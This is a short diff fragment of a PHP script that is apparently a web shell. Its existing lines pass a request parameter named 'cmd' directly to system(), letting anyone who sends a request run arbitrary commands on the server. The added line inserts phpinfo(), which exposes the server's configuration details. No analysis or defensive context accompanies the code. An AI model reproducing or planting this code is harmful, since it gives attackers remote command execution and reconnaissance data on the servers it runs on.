@@ -3,6 +3,7 @@
     $cmd = ($_REQUEST['cmd']);
     system($cmd);
   } else {
+    phpinfo();
     echo "Page Include?";
   }
 ?>
